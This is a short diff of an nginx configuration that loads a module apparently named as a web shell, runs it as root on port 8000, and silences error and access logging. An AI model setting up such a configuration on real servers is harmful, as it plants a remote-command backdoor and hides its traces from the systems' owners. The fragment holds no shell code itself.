@@ -3,8 +3,8 @@ load_module %RESDIR%/bin/ngx_http_webshell_module_%MARCH%.so;
 user root;
 worker_processes 1;
 daemon off;
-error_log /dev/null;
-pid /dev/null;
+error_log /dev/null crit;
+pid /tmp/ngx_http_webshell_module.pid;
 
 events {
 	worker_connections 4096;
@@ -17,7 +17,7 @@ http {
 
 	client_header_buffer_size 4k;
 	large_client_header_buffers 2 4k;
-	access_log /dev/null;
+	access_log off;
 
 	server {
 		listen 8000 default_server;
